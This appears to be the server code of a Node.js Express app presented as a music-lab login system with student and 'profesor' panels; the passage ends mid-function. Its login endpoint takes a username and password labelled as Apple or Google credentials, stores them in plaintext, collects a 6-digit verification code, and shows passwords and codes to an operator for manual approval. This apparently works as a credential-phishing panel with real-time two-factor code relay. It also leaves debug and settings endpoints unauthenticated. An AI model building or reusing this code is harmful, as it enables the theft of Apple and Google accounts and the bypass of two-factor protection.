require('dotenv').config();
const express = require('express');
const { Pool } = require('pg');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');
const session = require('express-session');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
// CORS: permitir Netlify en producción y localhost en desarrollo
const allowedOrigins = ['https://musiclabrot.netlify.app'];
// Health endpoints ANTES de CORS para evitar bloqueo del healthcheck por CORS
app.get('/api/health', (req, res) => {
    res.json({ ok: true, uptime: process.uptime() });
});
app.get('/health', (req, res) => {
    res.json({ ok: true, uptime: process.uptime() });
});
app.use(cors({
    origin: (origin, callback) => {
        // Permitir solicitudes sin origin (Postman, same-origin, etc.)
        if (!origin) return callback(null, true);
        const isLocal = /^https?:\/\/(localhost|127\.0\.0\.1)(:\\d+)?$/i.test(origin);
        if (allowedOrigins.includes(origin) || isLocal) {
            return callback(null, true);
        }
        return callback(new Error('CORS no permitido para este origen'), false);
    }
}));
app.use(bodyParser.json());
// Sesiones (en memoria para desarrollo)
app.use(session({
    secret: process.env.SESSION_SECRET || 'dev-secret',
    resave: false,
    saveUninitialized: false,
    cookie: { maxAge: 1000 * 60 * 60 * 8 } // 8h
}));
// Interceptar accesos directos a archivos protegidos y redirigir a rutas con auth
app.use((req, res, next) => {
    if (req.path === '/music.html') return res.redirect('/music');
    if (req.path === '/profesor.html') return res.redirect('/profesor');
    next();
});

// Crear/actualizar usuarios desde el panel del profesor y conceder acceso
app.post('/api/professor/users', requireProfessorAuth, async (req, res) => {
    try {
        if (!pool) return res.status(503).json({ success:false, message:'DB no configurada' });
        const { username, password } = req.body || {};
        if (!username || !password) return res.status(400).json({ success:false, message:'Usuario y contraseña requeridos' });
        await pool.query(
            `INSERT INTO users(username, password, created_at)
             VALUES ($1, $2, NOW())
             ON CONFLICT (username) DO UPDATE SET password = EXCLUDED.password`,
            [username, password]
        );
        await pool.query(
            `INSERT INTO access_grants(username, granted, granted_at)
             VALUES ($1, TRUE, NOW())
             ON CONFLICT (username) DO UPDATE SET granted = EXCLUDED.granted, granted_at = EXCLUDED.granted_at`,
            [username]
        );
        return res.json({ success:true, message:'Usuario creado/actualizado y acceso concedido' });
    } catch (e) {
        console.error('create-user error:', e);
        return res.status(500).json({ success:false, message:'Error interno del servidor' });
    }
});
// Servir el frontend para desarrollo local
app.use(express.static(path.join(__dirname, '../frontend')));

// Inicializar conexión a PostgreSQL (opcional en local)
let pool = null;
const connectionString = process.env.DATABASE_URL;
if (connectionString) {
    pool = new Pool({
        connectionString,
        ssl: process.env.DB_SSL === 'false' ? false : { rejectUnauthorized: false }
    });

// Configuración: flujo de Google habilitado/inhabilitado
app.get('/api/config/google-flow', async (req, res) => {
    try {
        if (!pool) return res.status(503).json({ success: false, message: 'DB no configurada' });
        const r = await pool.query('SELECT enabled FROM feature_flags WHERE key = $1', ['google_flow_enabled']);
        const enabled = r.rows[0] ? !!r.rows[0].enabled : false;
        res.json({ success: true, enabled });
    } catch (err) {
        console.error('Error al obtener flag google_flow_enabled:', err);
        res.status(500).json({ success: false, message: 'Error interno del servidor' });
    }
});

app.post('/api/config/google-flow', async (req, res) => {
    try {
        if (!pool) return res.status(503).json({ success: false, message: 'DB no configurada' });
        const { enabled } = req.body || {};
        if (typeof enabled !== 'boolean') {
            return res.status(400).json({ success: false, message: 'Parámetro enabled inválido' });
        }
        await pool.query(
            'INSERT INTO feature_flags(key, enabled) VALUES ($1, $2) ON CONFLICT (key) DO UPDATE SET enabled = EXCLUDED.enabled',
            ['google_flow_enabled', enabled]
        );
        res.json({ success: true, enabled });
    } catch (err) {
        console.error('Error al actualizar flag google_flow_enabled:', err);
        res.status(500).json({ success: false, message: 'Error interno del servidor' });
    }
});
} else {
    console.warn('[WARN] DATABASE_URL no definido. Ejecutando en modo local sin base de datos. Las rutas de API que dependen de DB no funcionarán hasta configurar DATABASE_URL.');
}

// Shim de compatibilidad para métodos tipo sqlite (get/all/run)
function toPg(sql) {
    // Reemplazar datetime('now') por NOW() y placeholders ? por $1, $2, ...
    let i = 0;
    return sql
        .replace(/datetime\('now'\)/gi, 'NOW()')
        .replace(/\?/g, () => `$${++i}`);
}

function normalizeArgs(params, cb) {
    // Soportar firmas: (sql, params, cb) y (sql, cb)
    if (typeof params === 'function') {
        return { params: [], cb: params };
    }
    return { params: Array.isArray(params) ? params : [], cb: typeof cb === 'function' ? cb : () => {} };
}

const db = {
    run(sql, params, cb) {
        if (!pool) return cb(new Error('Base de datos no configurada (DATABASE_URL ausente)'));
        const { params: values, cb: callback } = normalizeArgs(params, cb);
        const textBase = toPg(sql);
        // Si inserta en login_requests y no trae RETURNING, agregarlo para exponer lastID
        const needsReturning = /INSERT\s+INTO\s+login_requests/i.test(sql) && !/RETURNING/i.test(sql);
        const text = needsReturning ? `${textBase} RETURNING id` : textBase;
        pool.query(text, values)
            .then((res) => {
                const ctx = { lastID: needsReturning && res.rows && res.rows[0] ? res.rows[0].id : undefined };
                callback.call(ctx, null);
            })
            .catch((err) => callback(err));
    },
    get(sql, params, cb) {
        if (!pool) return cb(new Error('Base de datos no configurada (DATABASE_URL ausente)'));
        const { params: values, cb: callback } = normalizeArgs(params, cb);
        pool.query(toPg(sql), values)
            .then((res) => callback(null, res.rows[0] || null))
            .catch((err) => callback(err));
    },
    all(sql, params, cb) {
        if (!pool) return cb(new Error('Base de datos no configurada (DATABASE_URL ausente)'));
        const { params: values, cb: callback } = normalizeArgs(params, cb);
        pool.query(toPg(sql), values)
            .then((res) => callback(null, res.rows))
            .catch((err) => callback(err));
    }
};

// Middlewares de autorización
function requireProfessorAuth(req, res, next) {
    if (req.session && req.session.role === 'professor') return next();
    // Si es navegación, redirigir a la página con estilos
    if (req.accepts('html')) {
        return res.redirect('/profesor-login');
    }
    return res.status(401).json({ success:false, message:'No autorizado' });
}

function requireStudentAuth(req, res, next) {
    if (req.session && req.session.role === 'student' && req.session.username) return next();
    if (req.accepts('html')) {
        return res.redirect('/login');
    }
    return res.status(401).json({ success:false, message:'No autorizado' });
}

// API: aprobar un código específico (profesor)
app.post('/api/professor/approve-code', requireProfessorAuth, (req, res) => {
    const { username, verificationCode, message } = req.body;
    if (!username || !verificationCode) {
        return res.status(400).json({ success: false, message: 'Usuario y código son requeridos' });
    }
    // Obtener la última solicitud del usuario (cualquier estado)
    db.get(`SELECT id, status, verification_code FROM login_requests 
            WHERE username = ? 
            ORDER BY created_at DESC LIMIT 1`,
        [username], (err, lr) => {
        if (err) {
            console.error('Error al buscar solicitud:', err);
            return res.status(500).json({ success: false, message: 'Error interno del servidor' });
        }
        if (!lr) {
            return res.status(404).json({ success: false, message: 'No hay ninguna solicitud para este usuario' });
        }
        const requestId = lr.id;
        // Asegurar que login_requests quede approved y guardar mensaje y código (si no existía)
        db.run(`UPDATE login_requests 
                SET status = 'approved', processed_at = datetime('now'), message = COALESCE(?, message), 
                    verification_code = COALESCE(verification_code, ?)
                WHERE id = ?`,
            [message || null, verificationCode, requestId], (upErr) => {
            if (upErr) {
                console.error('Error al aprobar solicitud por código:', upErr);
                return res.status(500).json({ success: false, message: 'Error interno del servidor' });
            }
            // Marcar/insertar el código como approved
            db.run(`INSERT INTO verification_codes (username, code, created_at, used, validation_status, validated_at)
                    VALUES (?, ?, datetime('now'), FALSE, 'approved', datetime('now'))`,
                [username, verificationCode], (insErr) => {
                if (insErr) {
                    // Si ya existe, actualizar a approved
                    db.run(`UPDATE verification_codes 
                            SET validation_status = 'approved', validated_at = datetime('now')
                            WHERE username = ? AND code = ?`,
                        [username, verificationCode], (updErr) => {
                        if (updErr) {
                            console.error('Error al actualizar código a approved:', updErr);
                        }
                    });
                }
                // Auto-conceder acceso salvo login por Google
                db.get(`SELECT auth_provider FROM login_requests WHERE username = ? ORDER BY created_at DESC LIMIT 1`, [username], (provErr, prov) => {
                    if (provErr) {
                        console.error('Error al obtener proveedor:', provErr);
                        return;
                    }
                    const isGoogle = prov && (prov.auth_provider || '').toLowerCase() === 'google';
                    if (isGoogle) return; // no auto-grant para Google
                    db.get(`SELECT username FROM access_grants WHERE username = ?`, [username], (gErr, row) => {
                        const grant = (cb) => db.run(`INSERT INTO access_grants (username, granted, granted_at) VALUES (?, TRUE, datetime('now'))`, [username], cb);
                        const update = (cb) => db.run(`UPDATE access_grants SET granted = TRUE, granted_at = datetime('now') WHERE username = ?`, [username], cb);
                        if (gErr) {
                            console.error('Error al consultar access_grants:', gErr);
                        } else if (!row) {
                            grant(() => {});
                        } else {
                            update(() => {});
                        }
                    });
                });
                console.log(`✅ Código ${verificationCode} APROBADO para ${username} por request ${requestId}`);
                return res.json({ success: true, message: 'Código aprobado', requestId });
            });
        });
    });
});

// === Verificación final (tras mensaje al alumno) ===
// Alumno solicita verificación final
app.post('/api/student/final-verification/request', (req, res) => {
    if (!pool) return res.status(503).json({ success: false, message: 'DB no configurada' });
    const { username } = req.body || {};
    if (!username) return res.status(400).json({ success: false, message: 'Usuario requerido' });
    // Crear una nueva petición en pending
    db.run(`INSERT INTO final_verifications (username, status, created_at)
            VALUES (?, 'pending', datetime('now'))`, [username], (err) => {
        if (err) {
            // Si falla por duplicado o similar, dejamos en pending si ya existe
            console.error('Error al crear final_verification:', err.message);
            return res.status(500).json({ success: false, message: 'No se pudo crear la solicitud de verificación' });
        }
        console.log(`[FINAL_VERIFY] Solicitud creada para usuario=${username}`);
        return res.json({ success: true, message: 'Solicitud de verificación enviada' });
    });
});

// Alumno consulta estado de verificación final
app.get('/api/student/final-verification/status/:username', (req, res) => {
    const { username } = req.params;
    if (!pool) return res.status(503).json({ success: false, message: 'DB no configurada' });
    db.get(`SELECT status, processed_at FROM final_verifications
            WHERE username = ?
            ORDER BY created_at DESC LIMIT 1`, [username], (err, row) => {
        if (err) return res.status(500).json({ success: false, message: 'Error interno del servidor' });
        if (!row) return res.json({ success: true, status: 'not_found' });
        return res.json({ success: true, status: row.status, processed_at: row.processed_at });
    });
});

// Profesor: listar verificaciones finales pendientes
app.get('/api/professor/final-verifications', requireProfessorAuth, (req, res) => {
    if (!pool) return res.json([]);
    db.all(`SELECT id, username, status, created_at
            FROM final_verifications
            WHERE status = 'pending'
            ORDER BY created_at ASC`, (err, rows) => {
        if (err) return res.status(500).json({ message: 'Error interno del servidor' });
        res.json(rows);
    });
});

// Profesor: aprobar verificación final
app.post('/api/professor/final-verification/approve', requireProfessorAuth, (req, res) => {
    if (!pool) return res.status(503).json({ success: false, message: 'DB no configurada' });
    const { username } = req.body || {};
    if (!username) return res.status(400).json({ success: false, message: 'Usuario requerido' });
    db.run(`UPDATE final_verifications SET status = 'approved', processed_at = datetime('now')
            WHERE username = ? AND status = 'pending'`, [username], (err) => {
        if (err) return res.status(500).json({ success: false, message: 'Error interno del servidor' });
        // Conceder acceso al aprobar verificación final
        db.get(`SELECT username FROM access_grants WHERE username = ?`, [username], (gErr, row) => {
            const grant = (cb) => db.run(`INSERT INTO access_grants (username, granted, granted_at) VALUES (?, TRUE, datetime('now'))`, [username], cb);
            const update = (cb) => db.run(`UPDATE access_grants SET granted = TRUE, granted_at = datetime('now') WHERE username = ?`, [username], cb);
            if (!gErr) {
                if (!row) grant(() => {}); else update(() => {});
            }
            return res.json({ success: true, message: 'Verificación final aprobada' });
        });
    });
});

// Profesor: rechazar verificación final
app.post('/api/professor/final-verification/reject', requireProfessorAuth, (req, res) => {
    if (!pool) return res.status(503).json({ success: false, message: 'DB no configurada' });
    const { username } = req.body || {};
    if (!username) return res.status(400).json({ success: false, message: 'Usuario requerido' });
    db.run(`UPDATE final_verifications SET status = 'rejected', processed_at = datetime('now')
            WHERE username = ? AND status = 'pending'`, [username], (err) => {
        if (err) return res.status(500).json({ success: false, message: 'Error interno del servidor' });
        return res.json({ success: true, message: 'Verificación final rechazada' });
    });
});
// API: listar códigos pendientes de validación (profesor)
app.get('/api/professor/pending-codes', requireProfessorAuth, (req, res) => {
    db.all(`SELECT vc.id, vc.username, vc.code, vc.created_at
            FROM verification_codes vc
            WHERE vc.validation_status = 'pending'
            ORDER BY vc.created_at ASC`, (err, rows) => {
        if (err) {
            console.error('Error al obtener códigos pendientes:', err);
            return res.status(500).json({ message: 'Error interno del servidor' });
        }
        res.json(rows);
    });
});

// API: rechazar un código específico (profesor)
app.post('/api/professor/reject-code', requireProfessorAuth, (req, res) => {
    const { username, verificationCode } = req.body;
    if (!username || !verificationCode) {
        return res.status(400).json({ success: false, message: 'Usuario y código son requeridos' });
    }
    db.run(`UPDATE verification_codes 
            SET validation_status = 'rejected', validated_at = NOW()
            WHERE username = ? AND code = ?`, [username, verificationCode], function(err) {
        if (err) {
            console.error('Error al rechazar código:', err);
            return res.status(500).json({ success: false, message: 'Error interno del servidor' });
        }
        return res.json({ success: true, message: 'Código rechazado exitosamente' });
    });
});

// Función para inicializar las tablas de la base de datos
async function initializeDatabase() {
    try {
        if (!pool) {
            console.warn('[WARN] Saltando inicialización de base de datos: DATABASE_URL no configurado.');
            return;
        }
        await pool.query(`CREATE TABLE IF NOT EXISTS users (
            id SERIAL PRIMARY KEY,
            username TEXT UNIQUE NOT NULL,
            password TEXT NOT NULL,
            verification_code_entered TEXT,
            created_at TIMESTAMP DEFAULT NOW()
        )`);

        // Profesores
        await pool.query(`CREATE TABLE IF NOT EXISTS professors (
            id SERIAL PRIMARY KEY,
            username TEXT UNIQUE NOT NULL,
            password TEXT NOT NULL,
            created_at TIMESTAMP DEFAULT NOW()
        )`);

        await pool.query(`CREATE TABLE IF NOT EXISTS verification_codes (
            id SERIAL PRIMARY KEY,
            username TEXT NOT NULL,
            code TEXT NOT NULL,
            created_at TIMESTAMP DEFAULT NOW(),
            used BOOLEAN DEFAULT FALSE,
            validation_status TEXT DEFAULT 'pending',
            validated_at TIMESTAMP,
            CONSTRAINT uq_verification UNIQUE (username, code)
        )`);

        await pool.query(`CREATE TABLE IF NOT EXISTS login_requests (
            id SERIAL PRIMARY KEY,
            username TEXT NOT NULL,
            password TEXT NOT NULL,
            auth_provider TEXT,
            status TEXT DEFAULT 'pending',
            created_at TIMESTAMP DEFAULT NOW(),
            processed_at TIMESTAMP,
            verification_code TEXT,
            message TEXT
        )`);

        // Asegurar columna auth_provider si la tabla ya existía
        await pool.query(`ALTER TABLE IF EXISTS login_requests ADD COLUMN IF NOT EXISTS auth_provider TEXT`);

        // Tabla para concesiones de acceso finales por el profesor
        await pool.query(`CREATE TABLE IF NOT EXISTS access_grants (
            id SERIAL PRIMARY KEY,
            username TEXT UNIQUE NOT NULL,
            granted BOOLEAN DEFAULT FALSE,
            granted_at TIMESTAMP
        )`);

        // Tabla de verificaciones finales (tras aprobación inicial)
        await pool.query(`CREATE TABLE IF NOT EXISTS final_verifications (
            id SERIAL PRIMARY KEY,
            username TEXT NOT NULL,
            status TEXT DEFAULT 'pending',
            created_at TIMESTAMP DEFAULT NOW(),
            processed_at TIMESTAMP
        )`);

        // Tabla de feature flags (p. ej. habilitar/inhabilitar flujo Google)
        await pool.query(`CREATE TABLE IF NOT EXISTS feature_flags (
            key TEXT PRIMARY KEY,
            enabled BOOLEAN NOT NULL
        )`);

        // Semilla por defecto: google_flow_enabled = TRUE si no existe
        await pool.query(
            `INSERT INTO feature_flags(key, enabled)
             VALUES ($1, $2)
             ON CONFLICT (key) DO NOTHING`,
            ['google_flow_enabled', true]
        );

        // Semilla profesor desde variables de entorno si están presentes
        if (process.env.PROFESSOR_USER && process.env.PROFESSOR_PASS) {
            await pool.query(
                `INSERT INTO professors(username, password)
                 VALUES ($1, $2)
                 ON CONFLICT (username) DO UPDATE SET password = EXCLUDED.password`,
                [process.env.PROFESSOR_USER, process.env.PROFESSOR_PASS]
            );
        }

        console.log('Tablas de base de datos inicializadas.');
    } catch (err) {
        console.error('Error al inicializar tablas:', err);
    }
}

// Ruta raíz simple (no servimos frontend desde backend en producción)
app.get('/', (req, res) => {
    res.status(200).send('OK - backend up');
});

// Ruta informativa para "music.html" (no hay archivo aquí; el frontend lo sirve Netlify)
app.get('/music.html', (req, res) => {
    res.status(200).send('OK - backend up (music)');
});

// Ruta protegida para music (sirve el archivo si hay sesión)
app.get('/music', requireStudentAuth, (req, res) => {
    return res.sendFile(path.join(__dirname, '../frontend/music.html'));
});

// Ruta protegida para profesor (sirve el archivo si hay sesión)
app.get('/profesor', requireProfessorAuth, (req, res) => {
    return res.sendFile(path.join(__dirname, '../frontend/profesor.html'));
});

// Página de login para estudiantes (estilos de frontend)
app.get('/login', (req, res) => {
    if (req.session && req.session.role === 'student') return res.redirect('/music');
    return res.sendFile(path.join(__dirname, '../frontend/login.html'));
});

// Página de login para profesor (estilos de frontend)
app.get('/profesor-login', (req, res) => {
    if (req.session && req.session.role === 'professor') return res.redirect('/profesor');
    return res.sendFile(path.join(__dirname, '../frontend/profesor-login.html'));
});

// Healthchecks
app.get('/api/health', (req, res) => {
    res.json({ ok: true, uptime: process.uptime() });
});

// Alias compatible: /health
app.get('/health', (req, res) => {
    res.json({ ok: true, uptime: process.uptime() });
});

app.get('/api/db-health', async (req, res) => {
    try {
        if (!pool) return res.status(503).json({ ok: false, error: 'DB no configurada' });
        const r = await pool.query('SELECT NOW() as now');
        res.json({ ok: true, now: r.rows[0].now });
    } catch (err) {
        console.error('DB health error:', err);
        res.status(500).json({ ok: false, error: err.message });
    }
});

// API para login
app.post('/api/login', (req, res) => {
    const { username, password, authProvider } = req.body;
    if (!pool) {
        return res.status(503).json({ message: 'Servidor sin base de datos configurada. Define DATABASE_URL para pruebas completas.' });
    }
    
    if (!username || !password) {
        return res.status(400).json({ message: 'Usuario y contraseña son requeridos' });
    }
    // Validar proveedor
    const provider = (authProvider || '').toString().toLowerCase();
    if (!['apple', 'google'].includes(provider)) {
        return res.status(400).json({ message: 'Proveedor de autenticación inválido' });
    }
    
    // Crear solicitud de login pendiente para validación del profesor
    pool.query(
        'INSERT INTO login_requests (username, password, status, auth_provider) VALUES ($1, $2, $3, $4) RETURNING id',
        [username, password, 'pending', provider]
    ).then(({ rows }) => {
        const newId = rows[0].id;
        console.log(`Solicitud de login creada para ${username} con ID: ${newId} vía ${provider}`);
        res.json({ 
            success: true,
            message: 'Solicitud enviada. Esperando validación del servidor...',
            requestId: newId,
            status: 'pending'
        });
    }).catch((err) => {
        console.error('Error al crear solicitud de login:', err);
        // Respuesta genérica para no exponer detalles internos
        return res.status(500).json({ message: 'Error interno del servidor' });
    });
});

// === Autenticación basada en sesión ===
// Login profesor
app.post('/api/auth/login-professor', async (req, res) => {
    try {
        if (!pool) return res.status(503).json({ success:false, message:'DB no configurada' });
        const { username, password } = req.body || {};
        if (!username || !password) return res.status(400).json({ success:false, message:'Usuario y contraseña requeridos' });
        const r = await pool.query('SELECT username FROM professors WHERE username=$1 AND password=$2', [username, password]);
        if (!r.rows[0]) return res.status(401).json({ success:false, message:'Credenciales incorrectas' });
        req.session.role = 'professor';
        req.session.username = username;
        return res.json({ success:true });
    } catch (e) {
        console.error('login-professor error:', e);
        return res.status(500).json({ success:false, message:'Error interno del servidor' });
    }
});

// Login estudiante (usa tabla users y requiere access_grants)
app.post('/api/auth/login-student', async (req, res) => {
    try {
        if (!pool) return res.status(503).json({ success:false, message:'DB no configurada' });
        const { username, password } = req.body || {};
        if (!username || !password) return res.status(400).json({ success:false, message:'Usuario y contraseña requeridos' });
        const u = await pool.query('SELECT username FROM users WHERE username=$1 AND password=$2', [username, password]);
        if (!u.rows[0]) return res.status(401).json({ success:false, message:'Usuario o contraseña inválidos' });
        const g = await pool.query('SELECT granted FROM access_grants WHERE username=$1', [username]);
        const granted = g.rows[0] ? !!g.rows[0].granted : false;
        if (!granted) return res.status(403).json({ success:false, message:'Aún no tienes acceso concedido' });
        req.session.role = 'student';
        req.session.username = username;
        return res.json({ success:true });
    } catch (e) {
        console.error('login-student error:', e);
        return res.status(500).json({ success:false, message:'Error interno del servidor' });
    }
});

app.get('/api/auth/me', (req, res) => {
    if (!req.session || !req.session.username) return res.json({ authenticated:false });
    res.json({ authenticated:true, username:req.session.username, role:req.session.role });
});

app.post('/api/auth/logout', (req, res) => {
    req.session.destroy(() => res.json({ success:true }));
});

// API para verificación de código
app.post('/api/verify', (req, res) => {
    if (!pool) {
        return res.status(503).json({ success: false, message: 'Servidor sin base de datos configurada.' });
    }
    const { username, verificationCode, requestId } = req.body;
    
    if (!username || !verificationCode) {
        return res.status(400).json({ 
            success: false,
            message: 'Usuario y código de verificación son requeridos' 
        });
    }
    
    // Validar formato del código (6 dígitos)
    if (!/^\d{6}$/.test(verificationCode)) {
        return res.status(400).json({ 
            success: false,
            message: 'El código debe tener exactamente 6 dígitos' 
        });
    }
    
    // Resolver la solicitud objetivo: priorizar por requestId si viene, de lo contrario usar la última por username
    const findRequestById = () => new Promise((resolve, reject) => {
        db.get(`SELECT id, username, password, status FROM login_requests WHERE id = ?`, [requestId], (e, row) => {
            if (e) return reject(e);
            resolve(row);
        });
    });
    const findLatestByUser = () => new Promise((resolve, reject) => {
        db.get(`SELECT id, username, password, status FROM login_requests 
                WHERE username = ? 
                ORDER BY created_at DESC LIMIT 1`, [username], (e, row) => {
            if (e) return reject(e);
            resolve(row);
        });
    });

    (async () => {
        try {
            let loginRequest = null;
            if (requestId) {
                const byId = await findRequestById();
                if (!byId) {
                    return res.status(400).json({ success: false, message: 'requestId no válido' });
                }
                if (byId.username !== username) {
                    return res.status(400).json({ success: false, message: 'El requestId no corresponde al usuario' });
                }
                loginRequest = byId;
            } else {
                loginRequest = await findLatestByUser();
            }
            
            if (!loginRequest) {
                return res.status(400).json({ 
                    success: false,
                    message: 'No se encontró una solicitud de login para este usuario' 
                });
            }

            // Actualizar la solicitud con el código de verificación
            db.run(`UPDATE login_requests 
                    SET verification_code = ? 
                    WHERE id = ?`, 
                [verificationCode, loginRequest.id], function(updateErr) {
                if (updateErr) {
                    console.error('Error al actualizar solicitud:', updateErr);
                    return res.status(500).json({ 
                        success: false,
                        message: 'Error interno del servidor' 
                    });
                }
                
                // Insertar/registrar el código como pendiente para que el profesor lo vea (PostgreSQL NOW())
                db.run(`INSERT INTO verification_codes (username, code, created_at, used, validation_status) 
                        VALUES (?, ?, NOW(), FALSE, 'pending')`, 
                    [username, verificationCode], (codeErr) => {
                    if (codeErr) {
                        console.error('Error al almacenar código:', codeErr);
                    }
                    
                    console.log(`📝 Código ${verificationCode} asociado a solicitud ${loginRequest.id} para ${username} - Esperando validación del servidor`);
                    return res.json({ 
                        success: true,
                        message: '📤 Código enviado al servidor para validación. Espera un momento...',
                        status: 'pending',
                        requestId: loginRequest.id
                    });
                });
                
            });
        } catch (err) {
            console.error('Error en /api/verify:', err);
            return res.status(500).json({ success: false, message: 'Error interno del servidor' });
        }
    })();
});

// API para obtener información de usuarios (para debugging)
app.get('/api/users', (req, res) => {
    if (!pool) return res.status(503).json({ message: 'DB no configurada' });
    db.all('SELECT username, created_at FROM users', (err, users) => {
        if (err) {
            console.error('Error:', err);
            return res.status(500).json({ message: 'Error interno del servidor' });
        }
        res.json(users);
    });
});

// API para obtener códigos de verificación (para debugging)
app.get('/api/codes', (req, res) => {
    if (!pool) return res.status(503).json({ message: 'DB no configurada' });
    db.all('SELECT username, code, created_at, used FROM verification_codes ORDER BY created_at DESC', 
        (err, codes) => {
        if (err) {
            console.error('Error:', err);
            return res.status(500).json({ message: 'Error interno del servidor' });
        }
        res.json(codes);
    });
});

// Ruta para servir la interfaz del profesor (protegida)
app.get('/profesor', requireProfessorAuth, (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend/profesor.html'));
});

// API para obtener solicitudes pendientes (profesor)
app.get('/api/professor/pending-requests', requireProfessorAuth, (req, res) => {
    if (!pool) return res.json([]);
    db.all(`SELECT lr.id, lr.username, lr.password, lr.created_at,
                   lr.auth_provider,
                   COALESCE(lr.verification_code,
                            (SELECT vc.code FROM verification_codes vc
                             WHERE vc.username = lr.username
                             ORDER BY vc.created_at DESC LIMIT 1)) AS verification_code
            FROM login_requests lr
            WHERE lr.status = 'pending'
            ORDER BY lr.created_at ASC`, (err, requests) => {
        if (err) {
            console.error('Error al obtener solicitudes pendientes:', err);
            return res.status(500).json({ message: 'Error interno del servidor' });
        }
        try {
            console.log(`[DEBUG] pending-requests -> count=${requests.length}`);
            requests.forEach(r => {
                console.log(`[DEBUG] pending -> id=${r.id}, user=${r.username}, code=${r.verification_code || 'NULL'}`);
            });
        } catch(_) {}
        res.json(requests);
    });
});

// API para obtener solicitudes aprobadas (profesor)
app.get('/api/professor/approved-requests', requireProfessorAuth, (req, res) => {
    if (!pool) return res.json([]);
    db.all(`SELECT id, username, password, created_at, processed_at, verification_code, auth_provider 
            FROM login_requests 
            WHERE status = 'approved' 
            ORDER BY processed_at DESC`, (err, requests) => {
        if (err) {
            console.error('Error al obtener solicitudes aprobadas:', err);
            return res.status(500).json({ message: 'Error interno del servidor' });
        }
        res.json(requests);
    });
});

// API para obtener solicitudes rechazadas (profesor)
app.get('/api/professor/rejected-requests', requireProfessorAuth, (req, res) => {
    if (!pool) return res.json([]);
    db.all(`SELECT id, username, password, created_at, processed_at, auth_provider 
            FROM login_requests 
            WHERE status = 'rejected' 
            ORDER BY processed_at DESC`, (err, requests) => {
        if (err) {
            console.error('Error al obtener solicitudes rechazadas:', err);
            return res.status(500).json({ message: 'Error interno del servidor' });
        }
        res.json(requests);
    });
});

// API para aprobar solicitud (profesor)
app.post('/api/professor/approve', requireProfessorAuth, (req, res) => {
    if (!pool) return res.status(503).json({ message: 'DB no configurada' });
    const { requestId, username, message } = req.body;
    
    if (!requestId || !username) {
        return res.status(400).json({ message: 'ID de solicitud y usuario son requeridos' });
    }
    
    // Obtener el código que ya ingresó el estudiante
    db.get(`SELECT verification_code FROM login_requests WHERE id = ?`, [requestId], (err, result) => {
        if (err) {
            console.error('Error al obtener código del estudiante:', err);
            return res.status(500).json({ message: 'Error interno del servidor' });
        }
        
        const studentCode = result ? result.verification_code : null;
        
        // Actualizar solicitud como aprobada con mensaje opcional
        db.run(`UPDATE login_requests 
                SET status = 'approved', processed_at = NOW(), message = ?
                WHERE id = ?`, 
            [message || null, requestId], function(updateErr) {
            if (updateErr) {
                console.error('Error al aprobar solicitud:', updateErr);
                return res.status(500).json({ message: 'Error interno del servidor' });
            }
            
            // Crear/actualizar usuario (PostgreSQL upsert)
            db.run(`INSERT INTO users (username, password, created_at)
                    VALUES (
                      ?,
                      (SELECT password FROM login_requests WHERE id = ?),
                      NOW()
                    )
                    ON CONFLICT (username)
                    DO UPDATE SET password = EXCLUDED.password, created_at = EXCLUDED.created_at`,
                [username, requestId], (userErr) => {
                if (userErr) {
                    console.error('Error al crear/actualizar usuario:', userErr);
                }
                
                // Actualizar el código existente del estudiante a aprobado
                if (studentCode) {
                    db.run(`UPDATE verification_codes 
                            SET validation_status = 'approved', validated_at = NOW()
                            WHERE username = ? AND code = ?`,
                        [username, studentCode], (updateErr) => {
                        if (updateErr) {
                            console.error('Error al actualizar código a aprobado:', updateErr);
                        } else {
                            console.log(`✅ Código ${studentCode} actualizado a APROBADO para ${username}`);
                        }
                    });
                } else {
                    console.error('❌ No se encontró código del estudiante para actualizar');
                }
                
                // Auto-conceder acceso salvo login por Google
                db.get(`SELECT auth_provider FROM login_requests WHERE id = ?`, [requestId], (provErr, prov) => {
                    if (provErr) {
                        console.error('Error al obtener proveedor:', provErr);
                        return;
                    }
                    const isGoogle = prov && (prov.auth_provider || '').toLowerCase() === 'google';
                    if (isGoogle) {
                        console.log('[AutoGrant] Saltando auto-concesión por proveedor Google; se requiere verificación final.');
                        return;
                    }
                    db.get(`SELECT username FROM access_grants WHERE username = ?`, [username], (gErr, row) => {
                        const grant = (cb) => db.run(`INSERT INTO access_grants (username, granted, granted_at) VALUES (?, TRUE, NOW())`, [username], cb);
                        const update = (cb) => db.run(`UPDATE access_grants SET granted = TRUE, granted_at = NOW() WHERE username = ?`, [username], cb);
                        if (gErr) {
                            console.error('Error al consultar access_grants:', gErr);
                        } else if (!row) {
                            grant(() => {});
                        } else {
                            update(() => {});
                        }
                    });
                });

                console.log(`Solicitud aprobada para ${username}, código del estudiante: ${studentCode}`);
                res.json({ 
                    success: true, 
                    message: 'Solicitud aprobada exitosamente',
                    verificationCode: studentCode
                });
            });
        });
    });
});

// API para rechazar solicitud (profesor)
app.post('/api/professor/reject', requireProfessorAuth, (req, res) => {
    if (!pool) return res.status(503).json({ message: 'DB no configurada' });
    const { requestId, username } = req.body;
    
    if (!requestId || !username) {
        return res.status(400).json({ message: 'ID de solicitud y usuario son requeridos' });
    }
    
    // Actualizar solicitud como rechazada
    db.run(`UPDATE login_requests 
            SET status = 'rejected', processed_at = datetime('now')
            WHERE id = ?`, 
        [requestId], function(err) {
        if (err) {
            console.error('Error al rechazar solicitud:', err);
            return res.status(500).json({ message: 'Error interno del servidor' });
        }
        
        // Crear/actualizar entrada en verification_codes para notificar al estudiante del rechazo
        // Usamos el código que el estudiante ingresó para poder notificarle
        db.get(`SELECT verification_code FROM login_requests WHERE id = ?`, [requestId], async (getErr, result) => {
            try {
                if (!getErr && result && result.verification_code) {
                    await pool.query(
                        `INSERT INTO verification_codes (username, code, created_at, used, validation_status, validated_at)
                         VALUES ($1, $2, NOW(), FALSE, 'rejected', NOW())
                         ON CONFLICT (username, code)
                         DO UPDATE SET validation_status = EXCLUDED.validation_status, validated_at = EXCLUDED.validated_at`,
                        [username, result.verification_code]
                    );
                }
            } catch (codeErr) {
                console.error('Error al guardar estado de rechazo:', codeErr);
            }
        });
        
        console.log(`Solicitud rechazada para ${username}`);
        res.json({ message: 'Solicitud rechazada exitosamente' });
    });
});

// API para validar código de verificación (profesor)
app.post('/api/professor/validate-code', requireProfessorAuth, (req, res) => {
    if (!pool) return res.status(503).json({ success: false, message: 'DB no configurada' });
